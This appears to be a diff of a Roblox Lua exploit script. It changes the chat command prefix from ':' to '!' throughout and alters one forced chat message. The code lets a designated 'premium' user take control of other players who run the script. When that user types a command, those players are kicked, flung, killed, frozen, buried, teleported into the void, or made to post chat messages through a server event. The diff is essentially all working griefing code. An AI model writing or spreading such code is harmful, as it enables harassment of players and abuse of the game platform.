@@ -50,7 +50,7 @@ local unfreeze = function()
 end
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":kick .") then
+	if cht:match("!kick .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer:Kick("Kicked by Premium user")
 		end
@@ -59,7 +59,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":fling .") then
+	if cht:match("!fling .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
 			power = 99999999 -- change this to make it more or less powerful
@@ -81,9 +81,9 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":benx .") then
+	if cht:match("!benx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
-			wait(0) local A_1 = "Yeah Yeah!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+			wait(0) local A_1 = "riot is pro" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
 			game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = user_premium__001.Character.HumanoidRootPart
 			local benxed = true
 			while benxed == true do
@@ -105,7 +105,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":unbenx .") then
+	if cht:match("!unbenx .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			benxPos = player.Character.HumanoidRootPart.CFrame
 			game.Players.LocalPlayer.Character.Humanoid:Destroy()
@@ -117,7 +117,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":freeze .") then
+	if cht:match("!freeze .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			freeze()
 		end
@@ -126,7 +126,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":unfreeze .") then
+	if cht:match("!unfreeze .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			unfreeze()
 		end
@@ -135,7 +135,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":thaw .") then
+	if cht:match("!thaw .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			unfreeze()
 		end
@@ -144,7 +144,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":ban .") then
+	if cht:match("!ban .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer:kick("PERMA BAN")
 		end
@@ -153,7 +153,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":kill .") then
+	if cht:match("!kill .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.Humanoid:Destroy()
 		end
@@ -162,13 +162,13 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":premcmds") then
+	if cht:match("!premcmds") then
 	end
 
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":void .") then
+	if cht:match("!void .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -350, 0)
 		end
@@ -177,7 +177,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":bring .") then
+	if cht:match("!bring .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
 		end
@@ -186,7 +186,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":grave .") then
+	if cht:match("!grave .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
 			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
@@ -196,7 +196,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":ungrave .") then
+	if cht:match("!ungrave .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
 			wait(0.1)
@@ -207,7 +207,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":grave me") then
+	if cht:match("!grave me") then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y -10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
 			game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
 	end
@@ -215,7 +215,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":ungrave me") then
+	if cht:match("!ungrave me") then
 			game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
 			wait(0.1)
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.UpperTorso.Position.X, game.Players.LocalPlayer.Character.UpperTorso.Position.Y +10, game.Players.LocalPlayer.Character.UpperTorso.Position.z)
@@ -224,7 +224,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":kick me") then
+	if cht:match("!kick me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			game.Players.LocalPlayer:Kick("Kicked yourself")
 		end
@@ -233,7 +233,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":freeze me") then
+	if cht:match("!freeze me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			freeze()
 		end
@@ -242,7 +242,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":unfreeze me") then
+	if cht:match("!unfreeze me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			unfreeze()
 		end
@@ -251,7 +251,7 @@ user_premium__001.Chatted:connect(function(cht)
 end)
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":thaw me") then
+	if cht:match("!thaw me") then
 		if game.Players.LocalPlayer == user_premium__001 then
 			unfreeze()
 		end
@@ -262,7 +262,7 @@ end)
 ---------------------------------------------------------------------
 
 user_premium__001.Chatted:connect(function(cht)
-	if cht:match(":cmds") then
+	if cht:match("!cmds") then
 		if game.Players.LocalPlayer == user_premium__001 then
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = "Cmds:";
